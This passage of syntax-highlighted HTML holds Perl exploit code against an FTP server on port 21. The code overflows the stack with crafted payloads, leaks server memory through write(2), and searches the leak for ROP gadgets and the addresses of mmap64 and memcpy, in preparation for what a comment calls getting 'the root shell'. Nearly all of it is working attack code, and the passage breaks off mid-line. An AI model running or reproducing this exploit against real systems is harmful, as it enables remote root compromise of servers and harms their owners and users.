class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$k</code><code class="plain">). </code><code class="comments"># buffer for write</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xff\xff\x00\x00"</code><code class="plain">;&nbsp;&nbsp;&nbsp; </code><code class="comments"># length for write</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$v</code> <code class="plain">= &lt;</code><code class="variable">$sock</code><code class="plain">&gt;;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="variable">$sock</code> <code class="string">"\x00"</code> <code class="plain">x </code><code class="variable">$align</code> <code class="plain">. </code><code class="string">"\xff"</code> <code class="plain">. </code><code class="variable">$stack</code> <code class="plain">. </code><code class="string">"\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">vec</code> <code class="plain">(</code><code class="variable">$rfd</code><code class="plain">, </code><code class="functions">fileno</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">), 1) = 1;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$timeout</code> <code class="plain">= 2;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">(</code><code class="functions">select</code> <code class="plain">(</code><code class="variable">$rfd</code><code class="plain">, </code><code class="functions">undef</code><code class="plain">, </code><code class="functions">undef</code><code class="plain">, </code><code class="variable">$timeout</code><code class="plain">) &gt;= 0</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">&amp;&amp; </code><code class="functions">vec</code><code class="plain">(</code><code class="variable">$rfd</code><code class="plain">, </code><code class="functions">fileno</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">), 1))</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">(</code><code class="functions">read</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">, </code><code class="variable">$buff</code><code class="plain">, 0xffff) == 0xffff) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"\nSUCCESS. write(2) is at %08x\n"</code><code class="plain">, </code><code class="variable">$k</code><code class="plain">;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">close</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">goto</code> <code class="plain">lbl1;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">close</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"wrong write(2) offset.\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">lbl1:</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#&nbsp;&nbsp; Once we're here chances are good that we get the root shell</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Reading memory from server...\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">my</code> <code class="variable">$sock</code> <code class="plain">= IO::</code><code class="functions">Socket</code><code class="plain">::INET-&gt;new(PeerAddr =&gt; </code><code class="variable">$target</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PeerPort =&gt; 21,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Proto&nbsp;&nbsp;&nbsp; =&gt; </code><code class="string">'tcp'</code><code class="plain">);&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$stack</code> <code class="plain">= </code><code class="string">"KCOPERULEZKCOPERULEZKC"</code> <code class="plain">. </code><code class="string">"C"</code> <code class="plain">x </code><code class="variable">$padding</code> <code class="plain">. </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$k</code><code class="plain">).&nbsp; </code><code class="comments"># write</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xcc\xcc\xcc\xcc"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code><code class="comments"># fd for write</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$k</code><code class="plain">). </code><code class="comments"># buffer for write</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xff\xff\x0f\x00"</code><code class="plain">;&nbsp;&nbsp;&nbsp; </code><code class="comments"># length for write</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$v</code> <code class="plain">= &lt;</code><code class="variable">$sock</code><code class="plain">&gt;;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="variable">$sock</code> <code class="string">"\x00"</code> <code class="plain">x </code><code class="variable">$align</code> <code class="plain">. </code><code class="string">"\xff"</code> <code class="plain">. </code><code class="variable">$stack</code> <code class="plain">. </code><code class="string">"\n"</code><code class="plain">; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">read</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">, </code><code class="variable">$buff</code><code class="plain">, 0xfffff);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x5E\x5F\x5D"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$pop3ret</code> <code class="plain">= </code><code class="variable">$k</code> <code class="plain">+ </code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"pop pop pop ret located at %08x\n"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find pop pop pop ret\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x83\xC4\x20\x5B\x5E\x5D\xC3"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$largepopret</code> <code class="plain">= </code><code class="variable">$k</code> <code class="plain">+ </code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"large pop ret located at %08x\n"</code><code class="plain">, </code><code class="variable">$largepopret</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find pop pop pop ret\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xC7\x44\x24\x08\x03\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\x89\x44\x24\x04"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+23;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$mmap64</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+20, 4));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$mmap64</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$mmap64</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"mmap64 is located at %08x\n"</code><code class="plain">, </code><code class="variable">$mmap64</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x89\x44\x24\x10\xA1\xBC\xA5\x0F\x08\x89\x44\x24\x04\xe8"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+17;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$mmap64</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+14, 4));</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$mmap64</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$mmap64</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"mmap64 is located at %08x\n"</code><code class="plain">, </code><code class="variable">$mmap64</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find mmap64()\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x8D\x45\xF4\x89\x04\x24\x89\x54\x24\x08\x8B\x55\x08\x89\x54\x24\x04\xE8"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+21;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+18, 4));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$memcpy</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"memcpy is located at %08x\n"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x8B\x56\x10\x89\x44\x24\x08\x89\x54\x24\x04\x8B\x45\xE4\x89\x04\x24\xe8"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+21;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+18, 4));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$memcpy</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"memcpy is located at %08x\n"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x89\x44\x24\x04\xA1\xBC\x9F\x0E\x08\x89\x04\x24"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+16;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+13, 4));</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$memcpy</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code 